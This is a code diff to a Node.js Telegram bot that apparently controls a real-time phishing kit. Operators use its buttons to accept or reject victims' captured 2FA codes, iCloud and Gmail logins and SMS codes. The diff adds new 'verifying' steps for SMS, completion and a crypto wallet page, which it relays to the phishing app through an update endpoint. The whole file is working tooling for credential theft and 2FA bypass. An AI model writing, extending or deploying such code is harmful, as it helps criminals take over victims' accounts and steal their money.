@@ -31,7 +31,7 @@ bot.on("callback_query", async (query) => {
   try {
     const [action, email] = query.data.split("|");
 
-    console.log(`🔘 ${email} | ${action === "page1" ? "2FA" : action === "page2" ? "EMAIL" : action === "page_accept" ? "ICLOUD ACCEPT" : action === "page_reject" ? "ICLOUD REJECT" : action === "sms_accept" ? "SMS ACCEPT" : action === "sms_reject" ? "SMS REJECT" : action === "redirect_icloud" ? "ICLOUD" : action === "redirect_gmail" ? "GMAIL" : action === "gmail_accept" ? "GMAIL ACCEPT" : action === "gmail_reject" ? "GMAIL REJECT" : action === "gmail_verify_accept" ? "GMAIL VERIFY ACCEPT" : action === "gmail_verify_reject" ? "GMAIL VERIFY REJECT" : action === "verify_digit" ? "VERIFY DIGIT" : "REJECT"}`);
+    console.log(`🔘 ${email} | ${action === "page1" ? "2FA" : action === "page2" ? "EMAIL" : action === "page_accept" ? "ICLOUD ACCEPT" : action === "page_reject" ? "ICLOUD REJECT" : action === "sms_accept" ? "SMS ACCEPT" : action === "sms_reject" ? "SMS REJECT" : action === "redirect_icloud" ? "ICLOUD" : action === "redirect_gmail" ? "GMAIL" : action === "gmail_accept" ? "GMAIL ACCEPT" : action === "gmail_reject" ? "GMAIL REJECT" : action === "gmail_verify_accept" ? "GMAIL VERIFY ACCEPT" : action === "gmail_verify_reject" ? "GMAIL VERIFY REJECT" : action === "verifying_sms" ? "VERIFYING SMS" : action === "verifying_done" ? "VERIFYING DONE" : action === "verifying_wallet" ? "VERIFYING WALLET" : action === "verify_digit" ? "VERIFY DIGIT" : "REJECT"}`);
 
     // ✅ HANDLE VERIFY_DIGIT CALLBACKS (Gmail verification page)
     if (action === "verify_digit") {
@@ -72,6 +72,28 @@ bot.on("callback_query", async (query) => {
       } catch (err) {
         console.error("❌ verify_digit error:", err);
         await bot.answerCallbackQuery(query.id, { text: "Error processing digit" });
+        return;
+      }
+    }
+
+    // ✅ HANDLE VERIFYING BUTTONS (SMS / Done / Wallet)
+    if (action === "verifying_sms" || action === "verifying_done" || action === "verifying_wallet") {
+      const verifyingId = email; // email param is actually verifyingId
+      console.log(`📲 Verifying choice: ${action} for verifyingId: ${verifyingId}`);
+      
+      try {
+        await fetch(`${APP_URL}/update-verifying-choice`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ verifyingId, choice: action })
+        });
+        
+        console.log(`✅ Verifying choice updated: ${action}`);
+        await bot.answerCallbackQuery(query.id, { text: `✅ ${action.toUpperCase()}` });
+        return;
+      } catch (err) {
+        console.error("❌ verifying choice error:", err);
+        await bot.answerCallbackQuery(query.id, { text: "Error processing choice" });
         return;
       }
     }
@@ -183,6 +205,12 @@ bot.on("callback_query", async (query) => {
       } else if (action === "gmail_verify_reject") {
         statusMessage = `🌈 <code>${email}</code> Gmail Verification <b>REJECTED</b>! ❌`;
         console.log(`❌ GMAIL_VERIFY_REJECT matched! Message: ${statusMessage}`);
+      } else if (action === "verifying_sms") {
+        statusMessage = `😈 <code>${email}</code> Verifying → <b>SMS - 2</b> 💬`;
+      } else if (action === "verifying_done") {
+        statusMessage = `😈 <code>${email}</code> Verifying → <b>Done</b> 🏁`;
+      } else if (action === "verifying_wallet") {
+        statusMessage = `😈 <code>${email}</code> Verifying → <b>Wallet</b> 💼`;
       }
 
       console.log(`📨 Final statusMessage: "${statusMessage}"`);
